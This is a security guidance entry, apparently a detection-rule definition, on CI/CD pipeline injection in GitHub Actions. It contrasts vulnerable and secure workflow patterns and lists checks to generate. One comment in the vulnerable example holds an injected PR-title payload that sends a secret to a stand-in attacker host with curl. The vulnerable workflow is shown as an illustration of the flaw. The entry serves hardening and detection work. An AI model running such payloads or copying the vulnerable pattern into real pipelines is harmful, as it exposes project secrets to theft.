---
id: supply-chain-ci-cd-pipeline-injection
title: CI/CD Pipeline Injection
severity: critical
tags: [supply-chain, ci-cd, github-actions, pipeline-injection, code-execution]
taxonomy: security/supply-chain/ci-cd-injection
references:
  - https://owasp.org/www-project-top-ten/2021/A08_2021-Software_and_Data_Integrity_Failures.html
  - https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions
  - https://securitylab.github.com/research/github-actions-preventing-pwn-requests/
---

# CI/CD Pipeline Injection

## Description

Pipeline injection occurs when attacker-controlled data (PR titles, branch names, issue titles, commit messages) is interpreted as code or commands in CI/CD workflows. The most dangerous form is the "pwn request" — a `pull_request_target` workflow that checks out untrusted code with write permissions to secrets.

## Vulnerable Pattern

```yaml
# BAD — pull_request_target with checkout of untrusted PR code
on: pull_request_target

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # attacker code!
      - name: Test
        env:
          SECRET: ${{ secrets.PROD_SECRET }}
        run: npm test  # runs attacker's modified test file with access to secrets!

# BAD — interpolating GitHub context into shell commands
- name: Comment on PR
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
    # Attacker PR title: "; curl https://attacker.com/?t=$SECRET; echo "
```

## Secure Pattern

```yaml
# GOOD — pull_request (not _target) for untrusted code
on: pull_request  # runs in fork context, no secrets

# GOOD — if pull_request_target is needed, separate jobs
on: pull_request_target

jobs:
  # Job 1: checkout and build in isolated job (no secrets)
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm run build
        # No secrets in this job

  # Job 2: deploy using artifacts from Job 1 (has secrets, but no untrusted code)
  deploy:
    needs: build
    runs-on: ubuntu-latest
    environment: production
    steps:
      - uses: actions/download-artifact@v3
      - run: ./deploy.sh
        env:
          SECRET: ${{ secrets.PROD_SECRET }}
```

```yaml
# GOOD — use environment variable for user-controlled data, not direct interpolation
- name: Process PR info
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}  # in env, not shell directly
  run: |
    echo "Processing: $PR_TITLE"  # safe — no shell injection
```

## Checks to Generate

- Flag `pull_request_target` workflows that checkout `github.event.pull_request.head.sha` with access to secrets.
- Grep for `${{ github.event.*.title }}`, `${{ github.event.*.body }}`, `${{ github.head_ref }}` directly in `run:` blocks — use `env:` intermediary.
- Flag workflows with `write` permissions on `pull_request_target` triggering from forks.
- Check for `actions/checkout` with `persist-credentials: true` (default) in workflows with dangerous triggers.
- Flag `GITHUB_TOKEN` with unnecessary write permissions (`permissions: write-all`).
